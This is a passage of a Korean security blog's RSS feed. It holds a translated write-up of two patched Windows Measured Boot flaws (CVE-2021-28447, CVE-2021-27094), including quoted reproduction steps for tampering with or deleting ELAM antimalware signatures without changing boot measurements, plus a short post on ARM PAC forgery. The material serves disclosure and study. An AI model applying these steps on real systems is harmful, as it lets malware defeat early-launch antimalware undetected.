(0x3180)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%205.png" alt="measured-boot-vuln/Untitled%205.png"></p><blockquote><p>Figure 4<br>선택된 영역 - 값 목록(유효한 항목은 0x0230)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%206.png" alt="measured-boot-vuln/Untitled%206.png"></p><blockquote><p>Figure 5<br>선택된 영역 - 키 값<br>노란색 - 데이터 크기 (0x215C 또는 8540 bytes)<br>빨간색 - 데이터 오프셋 (0x1020, 데이터가 4 bytes 이하인 경우 직접 저장)<br>파란색 - 값 유형 (3 또는 REG_BINARY)<br>녹색 - 값 이름 ( “Measured”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%207.png" alt="measured-boot-vuln/Untitled%207.png"></p><blockquote><p>Figure 6<br>값 데이터</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%208.png" alt="measured-boot-vuln/Untitled%208.png"></p><blockquote><p>Figure 7<br>선택된 영역 - 데이터가 16344 bytes보다 크고 하이브 형식 버전이 1.4 이상인 경우의 Big Data Record Structure<br>빨간색 - 데이터 세그먼트 수 (2),<br>노란색 - 세그먼트 목록에 대한 오프셋 (0x3188)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%209.png" alt="measured-boot-vuln/Untitled%209.png"></p><blockquote><p>Figure 8<br>선택된 영역 - 값 데이터 세그먼트 목록<br>빨간색 - 두 개의 오프셋 (0x4020 및 0x 8020)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2010.png" alt="measured-boot-vuln/Untitled%2010.png"></p><blockquote><p>Figure 9<br>선택된 영역 - 세그먼트, 첫 번째 세그먼트에는 16344 bytes가 포함되고 마지막 세그먼트에는 나머지 데이터가 포함됨</p></blockquote><p>유심히 봐야 할 몇 가지 세부 사항</p><ol><li>레지스트리 하이브가 로드되면 형식 위반이 있는지 확인한다. 위반이 감지되면 참조를 포함하여 이를 수정하거나 관련 레지스트리를 삭제하려고 시도한다.</li><li>모든 하위 키 목록에 있는 요소의 사전 순 정렬이 확인된다. 두 개의 하위 키 (주어진 목록에 있는 현재 키와 이전 키)를 비교한 결과 잘못된 순서로 표시되면 현재 키가 삭제된다.</li><li>일반적으로 하이브가 마운트 되면 유저 모드 응용 프로그램이 잠기게 된다. 따라서 운영체제가 부팅을 완료하면 ELAM 하이브는 마운트 해제된 상태로 유지된다.</li><li>ELAM 하이브는 형식 버전 1.5를 사용하므로 Big Data Record가 활성화된다.</li><li>부팅 중에 Windows Loader는 ELAM 하이브를 단일 메모리 청크로 읽는다.</li></ol><h1 id="Measured-Boot-Vulnerabilities"><a href="#Measured-Boot-Vulnerabilities" class="headerlink" title="Measured Boot Vulnerabilities"></a>Measured Boot Vulnerabilities</h1><p>2020년 말, 2021년 초 관리자 권한으로 실행되는 악성 프로그램이 Measured Booting 프로세스에 영향을 주지 않고 ELAM 시그니처를 손상 및 삭제할 수 있는 두 가지 취약점을 발견하고 보고했다.</p><p>특히, Windows Loader는 ELAM 하이브에서 예상되는 레지스트리 값을 측정하는 반면 Windows Kernel은 손상된 ELAM 시그니처를 포함하거나 해당 레지스트리 값이 없는 하이브에서 다른 레지스트리 데이터를 확인해 이러한 Loader와 Kernel의 레지스트리 파싱 코드의 차이점을 악용한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2011.png" alt="measured-boot-vuln/Untitled%2011.png"></p><blockquote><p>발견된 취약점의 CVE ID</p></blockquote><p>두 취약점 모두 보상을 받을 수 있었으며 CVE-2021–27094의 경우 업데이트를 배포하는 데 90일 이상이 걸렸고 해당 패치로 인해 데이터 손상 이슈가 발생했다.</p><h2 id="CVE-2021–28447"><a href="#CVE-2021–28447" class="headerlink" title="CVE-2021–28447"></a>CVE-2021–28447</h2><p>16344 bytes보다 큰 데이터로 ELAM 값을 측정할 때 Windows Loader는 Big Data Record를 파싱하지 않는다. 따라서 측정 중인 ELAM blob이 16344 bytes보다 크면 취약점을 트리거할 수 있다. 아래는 측정된 ELAM 값에 대한 데이터를 가져오는 데 사용되는 디 컴파일된 함수이다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2012.png" alt="measured-boot-vuln/Untitled%2012.png"></p><blockquote><p>측정 값 데이터를 가져 오는 데 사용되는 함수</p></blockquote><p>일반적인 경우 값 데이터가 16344 bytes 보다 크지 않으면 <code>KeyValue-&gt;Data</code> 필드에는 전체 값 데이터가 포함되고 <code>memmove()</code> 함수로 해당 필드의 데이터를 변수 <code>Heap</code>에 복사한다. 그러나 해당 함수에는 하이브 형식 버전, 값 데이터 크기에 대한 검사 등 Big Data Record를 처리하기 위한 코드가 존재하지 않는다. 따라서 데이터가 16344 bytes보다 크면 <code>KeyValue-&gt;Data</code>에는 값 데이터 대신 Big Data Record로 채워지지만 <code>memmove()</code> 호출은 이를 데이터로 생각해 Big Data Record와 이후 레지스트리 데이터를 로드된 레지스트리 파일에서 <code>Heap</code>으로 복사하게 된다. </p><p>이를 악용하면 특정 조건에서 공격자는 측정에 영향을 주지 않고 ELAM Blob을 수정할 수 있다. 예를 들어 값 데이터 세그먼트가 Big Data Record 이전에, 즉 레지스트리 파일의 더 낮은 오프셋에 저장되면 힙 변수에 포함되지 않고 측정되어 실제 값 데이터는 측정되지 않는다. 또는 값 데이터 세그먼트가 Big Data Record 이후에 저장되면 측정되지 않아 측정 중 계산된 해시를 변경하지 않고 이후의 값 데이터를 변경할 수 있다.</p><p>ELAM 하이브는 부팅 완료 이후에는 로드되지 않으므로 어떤 방식으로든 (예 : HEX 편집기 등) 변경할 수 있으므로 공격자가 레지스트리 파일을 제한 없이 임의로 수정할 수 있다. </p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>이 취약점은 이전에는 Windows Loader에서 이러한 레지스트리 값을 읽을 필요가 없었으므로 Big Data Record 케이스를 지원하지 않는 레거시 코드로 인해 발생했다.</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에서 Big Data Record 케이스에 대한 지원을 구현하여 취약점을 수정했다. 해당 취약점은 ELAM blob의 임계값인 16344 bytes에 도달하지 않는 ELAM 드라이버에는 영향을 주지 않는다. </p><h3 id="Original-vulnerability-report"><a href="#Original-vulnerability-report" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryWhen an ELAM driver stores a binary larger than 16344 bytes in one of three measured values (called &quot;Measured&quot;, &quot;Policy&quot;, or &quot;Config&quot;) within the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), this binary isn&#x27;t measured correctly by the Windows loader (winload.exe or winload.efi).Under specific conditions, a modification made to an ELAM blob won&#x27;t result in different PCR values, thus not affecting the measured boot (since PCR values are equal to the expected ones).# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.<span class="hljs-number">2.</span> Add a <span class="hljs-keyword">new</span> key under the root of the ELAM hive. Assign a <span class="hljs-keyword">new</span> value to <span class="hljs-keyword">this</span> key (in <span class="hljs-keyword">this</span> report, the value will be called <span class="hljs-string">&quot;Measured&quot;</span>).<span class="hljs-number">3.</span> Write more than <span class="hljs-number">16344</span> bytes of data to that value (see: <span class="hljs-string">&quot;01-elam-blob.png&quot;</span>).<span class="hljs-number">4.</span> Unmount the ELAM hive.<span class="hljs-number">5.</span> Reboot the system.<span class="hljs-number">6.</span> During the boot, the Windows loader measures data starting from the beginning of the CM_BIG_DATA structure as pointed by the CM_KEY_VALUE structure describing the <span class="hljs-string">&quot;Measured&quot;</span> value (see: <span class="hljs-string">&quot;02-elam-blob-measured.png&quot;</span>).    Since the expected data length is larger than the CM_BIG_DATA structure, subsequent bytes of the hive file (actually, from the memory region used to store the hive file loaded) are included into the measurement (instead of actual value data).<span class="hljs-number">7.</span> After the boot, change (<span class="hljs-keyword">using</span> a registry editor) several bytes within the value data, without altering the data size (see: <span class="hljs-string">&quot;03-elam-blob-altered.png&quot;</span>).<span class="hljs-number">8.</span> Reboot the system.<span class="hljs-number">9.</span> During the boot, the Windows loader will see the same CM_BIG_DATA structure <span class="hljs-keyword">and</span> subsequent bytes as value data (see: <span class="hljs-string">&quot;04-elam-blob-altered-measured.png&quot;</span>).## Root causeThe Windows loader doesn<span class="hljs-number">&#x27;</span>t support parsing value data stored <span class="hljs-keyword">using</span> the CM_BIG_DATA structure. This structure is used when the hive format version is <span class="hljs-number">1.4</span> <span class="hljs-keyword">or</span> newer <span class="hljs-keyword">and</span> value data to be stored is larger than <span class="hljs-number">16344</span> bytes.The ELAM hive uses the format version <span class="hljs-number">1.5</span>. Thus, the CM_BIG_DATA structure is supported in the NT kernel, but <span class="hljs-keyword">not</span> in the Windows loader.The OslGetBinaryValue routine (in the Windows loader) provides back a pointer to cell data containing the CM_BIG_DATA structure instead of parsing <span class="hljs-keyword">this</span> <span class="hljs-keyword">and</span> related structures <span class="hljs-keyword">and</span> then providing a pointer to consolidated data segments.## Attack scenariosFirst, ELAM blobs larger than <span class="hljs-number">16344</span> bytes aren<span class="hljs-number">&#x27;</span>t measured correctly. This is a serious security issue by itself.Finally, <span class="hljs-keyword">if</span> an ELAM driver uses existing measured ELAM blobs larger than <span class="hljs-number">16344</span> bytes, a malicious usermode program could alter (corrupt <span class="hljs-keyword">or</span> downgrade) these blobs without affecting the measured boot.Such an attack is possible when:* a <span class="hljs-built_in">list</span> of cells containing value data segments is stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* such value data segments are stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* a <span class="hljs-built_in">list</span> of cells containing value data segments <span class="hljs-keyword">and</span> such value data segments are all stored after the CM_BIG_DATA structure, but there is a large gap after the CM_BIG_DATA structure   (which isn<span class="hljs-number">&#x27;</span>t smaller than the defined value data size, so the hash calculation won<span class="hljs-number">&#x27;</span>t reach the actual value data, <span class="hljs-keyword">or</span> it<span class="hljs-number">&#x27;</span>s smaller than that, but the hash calculation doesn<span class="hljs-number">&#x27;</span>t reach the modified bytes of actual value data).Under any specific condition defined above, changing offsets to value data segments <span class="hljs-keyword">or</span> changing value data segments respectively won<span class="hljs-number">&#x27;</span>t be noticed during the measurement. (Since the hash is calculated over the internals of the hive file, but <span class="hljs-keyword">not</span> over the actual value data.)Since the ELAM hive isn<span class="hljs-number">&#x27;</span>t loaded after the boot, a malicious usermode program can open it <span class="hljs-keyword">and</span> alter its data in any way possible (<span class="hljs-keyword">this</span> is <span class="hljs-keyword">not</span> limited to registry functions exposed by the Advapi32 library, the hive file can be opened <span class="hljs-keyword">and</span> edited in a HEX editor), thus exploiting any pre-existing condition defined above.## Possible solutionHandle the CM_BIG_DATA structure when parsing a registry value <span class="hljs-keyword">using</span> the Windows loader.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2013.png" alt="measured-boot-vuln/Untitled%2013.png"></p><blockquote><p>01-elam-blob.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2014.png" alt="measured-boot-vuln/Untitled%2014.png"></p><blockquote><p>02-elam-blob-measured.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2015.png" alt="measured-boot-vuln/Untitled%2015.png"></p><blockquote><p>03-elam-blob-altered.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2016.png" alt="measured-boot-vuln/Untitled%2016.png"></p><blockquote><p>04-elam-blob-altered-measured.png</p></blockquote><h2 id="CVE-2021–27094"><a href="#CVE-2021–27094" class="headerlink" title="CVE-2021–27094"></a>CVE-2021–27094</h2><p>이 취약점은 앞서 소개된 취약점보다 조금 복잡하다.<br>Windows Loader 또는 Windows Kernel에서는 하이브를 로드할 때 형식 위반이 있는지 확인한다. 이 검사는 Windows Loader에 의해 로드된 하이브에 대해 두 번 수행한 뒤 메모리의 Windows Kernel로 전달된다 (ELAM 하이브 포함).</p><p>이 검사 로직은 Windwos Loader와 Kernel이 유사하게 구현되었지만 차이점이 존재한다. 그중 하나가 Windows Loader는 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않는다는 것이다.</p><p>ELAM 하이브는 Windows Kernel에 의해 시작된 ELAM 드라이버에서 사용되므로 Windows Loader의 ELAM blob 측정과 ELAM 드라이버 사용 사이의 사전 순 정렬 검사가 삽입된다. Windows Loader에서 측정한 후 ELAM 드라이버에서 사용하기 전 ELAM blob을 포함하는 레지스트리 키를 임의 삭제하기 위해 이 검사 프로세스의 취약점을 이용할 수 있다.</p><p>공격자는 하이브를 마운트 한 다음 표준 API를 호출해 루트 키 아래에 있는 ELAM 하이브에 빈(값이 없는) 키를 삽입할 수 있다. 그리고 Windows Kernel이 측정된 ELAM blob이 존재하는 키를 삭제하도록 유도해야 하는데, 이는 공격자가 키 삽입 후 하이브의 마운트를 해제하고 HEX 편집기로 하이브 파일의 키 목록의 순서를 임의로 변경해 사전 순 정렬을 깨는 것으로 달성할 수 있다. </p><blockquote><p>역자:<br>하이브 마운트 → 표준 API로 빈 키 생성 → 마운트 해제 → 하이브 파일의 키 순서 변경<br>으로 나타낼 수 있습니다.</p></blockquote><br>위 설명의 예시는 아래 ELAM 하이브의 레이아웃을 살펴보면 이해가 쉽다.<ol><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li><li>Key: zz<ul><li>No values</li></ul></li></ol><blockquote><p>키 순서는 루트 키의 하위 키 목록에있는 키 노드 오프셋 순서를 반영</p></blockquote><p>위는 표준 API 호출을 사용해 “zz” 키를 삽입한 정상적인 레이아웃이다. 공격자는 원하는 다음 레이아웃을 얻기 위해 하위 키 목록을 수정해야 한다.</p><ol><li>Key: zz<ul><li>No values</li></ul></li><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li></ol><blockquote><p>하위 키 목록에서 두 요소의 순서를 반대로하면 취약점을 트리거할 수 있다.</p></blockquote><br>이제 사전 순 정렬이 깨졌다. <pre><code class="hljs c">Upcase(<span class="hljs-string">&quot;zz&quot;</span>) &gt; Upcase(<span class="hljs-string">&quot;Windows Defender&quot;</span>)</code></pre><p>Windows Kernel은 사전 순 정렬이 깨졌으므로 ELAM 드라이버에서 사용하기 전에 “Windows Defender”키를 삭제한다. 그러나 Windows Loader는 이러한 손상을 인식하지 못하고, 측정할 값이 없는 “zz”키를 건너뛰어 이미 삭제된 “Windows Defender” 키에 있는 “Measured”값을 측정한다. </p><p>결과적으로 이는 ELAM blob이 ELAM 드라이버가 실행되기 전에 삭제될 수 있음을 보여준다.</p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>이 취약점은 Windows Loader가 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않기 때문에 발생한다.</p><p>유니코드 형식의 키 이름이 허용되고, Windows Loader에는 적절한 대소문자 테이블(문자를 대문자로 변환하는 데 사용되는 테이블)이 없어 대소문자를 구분하지 않는 사전 순 정렬을 수행하지 못한다. 따라서 Windows Loader의 해당 기능이 의도적으로 제거된 것이 취약점이 발생한 원인이 되었다.</p><p>유니 코드 대문자 테이블은 Windows Kernel에서 사용되기 때문에 사전 순 정렬은 Kernel에서 구현되었다. 또한 Loader에서 완화된 검사로 인해 Kernel 이전에 로드된 하이브에 대한 검사까지 두 번 수행해야 한다.<br>흥미롭게도, 현재 구현으로는 유니 코드 문자에 대해 리팩토링 할 수 있지만 NLS 테이블을 로드하기 전에 SYSTEM 하이브를 로드해야 한다. </p><h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에 사전 순 정렬 검사를 도입하여 취약점을 패치했다. 유니 코드 대문자 테이블은 Windows Loader에서 사용되지 않으므로 ASCII 문자를 사용하는 키 이름으로만 제한된다. 현재 키 이름에 ASCII 문자 외의 형식을 사용하는 ELAM 드라이버는 없는 것으로 확인된다.</p><p>이러한 패치는 SYSTEM 하이브를 검사할 때 심각한 데이터 손상 문제의 원인이 된다. SYSTEM 하이브는 ELAM 하이브와 마찬가지로 초기 부팅 중에 로드되나 ASCII 문자 외 형식의 키를 포함할 수 있다.</p><p>Windows Loader의 유니코드 비교 함수는 유니코드 대문자 테이블을 사용하지 않기 때문에 ASCII 외의 문자를 확인할 수 있는 방법이 없다. 아래 코드는 Windows Kernel에서 두 개의 키 이름 (대소 문자 구분 없음)을 비교하는 데 사용된다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2017.png" alt="measured-boot-vuln/Untitled%2017.png"></p><blockquote><p>유니 코드 문자열을 비교하는 데 사용되는 함수</p></blockquote><p>코드를 보면 알 수 있듯이 “z”(“a”+ 0x19) 보다 높은 코드를 가진 문자의 경우 변환이 수행되지 않는다. 예를 들어 해당 코드에서는 “я”의 대문자 버전은 “Я”이 아니라 “я”이 된다.</p><p>Windows Kernel에서 구현된 동일한 함수는 유니 코드 대문자 테이블을 사용하므로 “я”의 대문자 버전은 “Я”로 정상적으로 변환이 된다. SYSTEM 하이브 내의 하위 키 목록에 있는 요소는 이에 따라 정렬되나 부팅하는 동안에는 Windows Loader의 함수를 사용하여 확인한다.</p><p>따라서 Windows Loader는 올바르게 정렬된 하위 키 목록을 손상된 것으로 간주해 레지스트리 키를 삭제한다.</p><p>해당 이슈를 재현하려면 동일한 상위 레지스트리 키 아래의 SYSTEM 하이브에서 이름이 “я1”및 “Я2”인 두 개의 레지스트리 키를 만든 다음 컴퓨터를 재부팅하면 된다.  Windows Kernel에서는 하위 키 목록이 다음과 같이 정렬된다.</p><ol><li><em>я1</em></li><li><em>Я2</em></li></ol><p>Windows Loader에서는 아래와 같이 인식한다. Loader는 이러한 정렬을 손상된 것으로 인식해 부팅 후 “Я2”키가 삭제되는 것을 확인할 수 있다.</p><pre><code class="hljs c">Upcase (<span class="hljs-string">&quot;я1&quot;</span>)&gt; Upcase (<span class="hljs-string">&quot;Я2&quot;</span>), Upcase (<span class="hljs-string">&quot;я1&quot;</span>) = <span class="hljs-string">&quot;я1&quot;</span></code></pre><p>Microsoft는 취약점을 확인했지만 범위를 벗어났다는 이유로 업데이트하지 않았다.</p><h3 id="Original-vulnerability-report-1"><a href="#Original-vulnerability-report-1" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryA malicious usermode program can modify the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), so its blobs (registry values called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;) are correctly measured on the next boot, but the ELAM driver won&#x27;t see them because registry keys containing these blobs are deleted by the NT kernel (even before the BOOT_DRIVER_CALLBACK_FUNCTION callback is registered). This results in proper (expected) PCR values but registry values (the ones previously measured) are absent when the ELAM driver tries to read them. So, the system will boot without proper ELAM signatures and this won&#x27;t affect the measured boot.# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.2. Add the &quot;zz&quot; key under the root key of the ELAM hive, don&#x27;t assign any values to this key (see: &quot;01-regedit.png&quot;).<span class="hljs-number">3.</span> Unmount the ELAM hive.4. Open the ELAM hive file in a HEX editor (you can open it because it&#x27;s not loaded), locate the subkeys list (subkeys of the root key), move the &quot;zz&quot; key to the first position on that list. (A key that was the first one before the move should now occupy the second position on the list. If there are three subkeys, just exchange the first and last keys on the list.)The idea is to <span class="hljs-keyword">break</span> the lexicographical order of subkeys. So, <span class="hljs-string">&quot;1 2&quot;</span> becomes <span class="hljs-string">&quot;2 1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;1 2 3&quot;</span> becomes <span class="hljs-string">&quot;3 2 1&quot;</span> (see: <span class="hljs-string">&quot;02-hexeditor-intact.png&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;03-hexeditor-modified.png&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;before&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;after&quot;</span> states of the hive file respectively).<span class="hljs-number">5.</span> Reboot the system.6. When the Windows loader (winload.exe or winload.efi) reads the ELAM hive, it doesn&#x27;t check the lexicographical order of subkeys (see: &quot;04-leaf-as-loaded-by-winload.png&quot;). It&#x27;s okay for the Windows loader if subkeys are stored in a wrong order.7. When the Windows loader measures the ELAM hive (in the OslpMeasureEarlyLaunchHive routine), it reads subkeys one-by-one and measures their values (called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;).8. If you manage to break the lexicographical order of subkeys by inserting empty keys and keeping real (non-empty) keys in the same order (relative to each other, not counting the empty keys), then the Windows loader will measure the usual (expected) data. This can be easily demonstrated with one key – &quot;Windows Defender&quot;. If you insert the <span class="hljs-string">&quot;zz&quot;</span> key <span class="hljs-keyword">using</span> a registry editor, it goes to the end of the subkeys <span class="hljs-built_in">list</span>. Like <span class="hljs-keyword">this</span>:- Windows Defender- zzIf you move the &quot;zz&quot; key to the top (using a HEX editor), the lexicographical order is broken, but since the &quot;zz&quot; key has no values, it doesn&#x27;t get measured. And the &quot;Windows Defender&quot; is measured as usual.9. When the NT kernel starts, it takes hives attached to the loader parameter block and validates them. At this point, the validation routine checks the lexicographical order. If a subkeys list isn&#x27;t sorted, offending keys are removed from the list (see: &quot;05-leaf-as-loaded-by-kernel.png&quot;, &quot;06-leaf-as-loaded-by-kernel.png&quot;, and &quot;07-leaf-after-check-by-kernel.png&quot;). This means that the <span class="hljs-string">&quot;Windows Defender&quot;</span> key from the example above is removed.10. When the ELAM driver tries to locate its signatures, they are gone – they were removed by the NT kernel because of the hive format violation (see: &quot;08-leaf-as-seen-by-elam.png&quot;).## Possible solutionsEither check the lexicographical order of subkeys in the Windows loader (which requires you to pick the NLS tables first) or measure empty keys together with non-empty ones.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2018.png" alt="measured-boot-vuln/Untitled%2018.png"></p><blockquote><p>01-regedit.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2019.png" alt="measured-boot-vuln/Untitled%2019.png"></p><blockquote><p>02-hexeditor-intact.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2020.png" alt="measured-boot-vuln/Untitled%2020.png"></p><blockquote><p>03-hexeditor-modified.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2021.png" alt="measured-boot-vuln/Untitled%2021.png"></p><blockquote><p>04-leaf-as-loaded-by-winload.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2022.png" alt="measured-boot-vuln/Untitled%2022.png"></p><blockquote><p>05-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2023.png" alt="measured-boot-vuln/Untitled%2023.png"></p><blockquote><p>06-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2024.png" alt="measured-boot-vuln/Untitled%2024.png"></p><blockquote><p>07-leaf-after-check-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2025.png" alt="measured-boot-vuln/Untitled%2025.png"></p><blockquote><p>08-leaf-as-seen-by-elam.png</p></blockquote><hr>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/boot-security/">boot security</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] PAC와 PAC Forgery</title>
+      <link>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</link>
+      <guid>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</guid>
+      <pubDate>Sun, 27 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.ret2.io/2021/06/16/intro-to-pac-arm</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/">https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/</a> </p></li><li><p><a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&gt; ARMv8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fabu1ous님이 말도 없이 제가 하루한줄로 쓰려던 주제를 어제 써버리는 바람에… 오늘은 <code>PAC</code>와 <code>PAC Forgery</code>에 대해서 간단하게 알아보도록 하겠습니다.</p><p><code>PAC</code>는 <code>Pointer Authentication Code</code>의 약자로, 말 그대로 포인터들을 인증하는 미티게이션 기법입니다. <code>ARMv8.3-A</code>부터 지원하며 iOS에서 이 미티게이션을 지원하면서 익스플로잇 난이도가 많이 올라갔다고 합니다.</p><blockquote><p>예… 저는 안해봐서 얼마나 어려운지 모르겠네요…?</p></blockquote><p>안드로이드에서도 지원을 하는지 여부는 제대로 확인을 못해봤습니다. <code>ARMv9</code>로 나오는 Cortex CPU에서 <code>PAC</code>를 지원하는 <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/first-armv9-cpu-cores">기사</a>를 봤는데, 혹시 아시는 분이 있으면 댓글 달아주세요 ㅜㅜ</p><p><code>PAC</code>가 동작하는 방식은 매우 “간단”합니다.</p><p>먼저, pac로 시작하는 명령어(ex. <code>paciasp</code>, <code>pacia</code>)를 통해 context와 key 그리고 해당 포인터를 이용해 sign을 합니다. 이 때, key는 128비트 값이며 시스템 레지스터에 저장되어 있는데, 일단 유저 권한에서는 당연히 접근할 수 없습니다. context는 64비트 값을 사용합니다. <code>paciasp</code>를 사용하여 PAC를 생성할 경우, 스택 포인터를 사용합니다.(<code>paciasp</code>의 맨뒤가 sp인 이유)</p><p>그리고 이 세 개의 값은 특정 알고리즘으로 계산되어 PAC를 생성할 수 있는데, 기본적으로 <a href="https://eprint.iacr.org/2016/444.pdf">QARMA</a>를 사용하고 CPU 제조사마다 커스텀이 가능합니다. 이렇게 생성된 <code>PAC</code>는 sign하려고 한 포인터의 상위 주소에 저장됩니다.</p><p>Sign한 뒤, 해당 포인터를 사용할 때에는 먼저 aut로 시작하는 명령어를 사용하여 해당 포인터가 변조되었는지를 확인합니다. 똑같이 포인터 값과 context 그리고 key 값을 사용해 해당 포인터가 정상인지를 검증합니다. 따라서 userspace에서는 <code>PAC</code>생성 알고리즘에서 사용하는 key와 context뿐만 아니라 <code>PAC</code>를 생성하는 알고리즘을 알고 있어야만 알고리즘에 부합하는 값을 얻어낼 수 있습니다.</p><p><code>PAC Forgery</code>는 key와 알고리즘 없이 이를 우회하는 기법입니다.</p><p>첫 번째 블로그의 예시 문제에서는 간단한 버퍼 오버플로우를 통해 <code>LR</code>을 조작할 수 있습니다. 이 문제는 ASLR이 걸려있지 않기 때문에 PAC 생성에 사용되는 스택 주소는 디버깅을 통해 알 수 있습니다.</p><p>그리고 <code>sign_contract()</code>함수를 살펴보면 <code>pacia</code> 명령어를 이용해 특정 레지스터에 대한 PAC를 생성합니다. 이처럼 사용자가 활용할 수 있는 <code>pacia</code> 명령어가 존재하고 context를 알고 있다면 원하는 <code>PAC</code> 코드를 생성할 수 있습니다. 그러면 이런 기능을 활용하여 점프하고 싶은 주소에 대한 <code>PAC</code> 코드를 생성하고 <code>LR</code>에 넣으면 원하는 주소로 점프하여 익스플로잇을 할 수 있게 됩니다.</p><p>다만, 해당 예시 문제는 <code>pacia</code>를 자유롭게 활용할 수 있는 상황이고 <code>ASLR</code>이 안 걸려 있어 익스플로잇하기 매우 쉬운 상황입니다. 리얼월드에서는 기본적으로 <code>information leak</code> 취약점과 pac 명령어들을 활용하는 취약점이 있어야하기 때문에 기본적으로 두개의 취약점을 가지고 있어야 익스플로잇을 해볼 수 있습니다. 이래서 어려운건지 모르겠네요. 언젠가는 제가 직접 익스플로잇을 해보면서 이에 대해 설명하는 글을 써보도록 하겠습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/arm64/">arm64</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/pac/">pac</category>
+      
